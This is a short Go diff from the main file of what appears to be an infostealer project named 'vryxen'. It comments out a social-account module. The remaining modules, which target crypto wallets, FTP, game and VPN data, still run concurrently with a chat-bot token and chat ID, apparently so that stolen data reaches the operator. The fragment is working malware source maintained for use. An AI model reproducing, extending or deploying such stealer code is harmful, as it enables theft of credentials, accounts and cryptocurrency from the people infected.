@@ -15,7 +15,7 @@ import (
 
 
 	
-	"github.com/unf6/vryxen/internal/core/socials"
+	//"github.com/unf6/vryxen/internal/core/socials"
 	"github.com/unf6/vryxen/internal/core/cryptowallets"
 	"github.com/unf6/vryxen/internal/core/ftps"
 	"github.com/unf6/vryxen/internal/core/games"
@@ -77,7 +77,7 @@ func main() {
 		vpn.Run,
 	}
 
-	Socials.Run()
+	//Socials.Run()
 	for _, action := range actions {
 		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
 	}
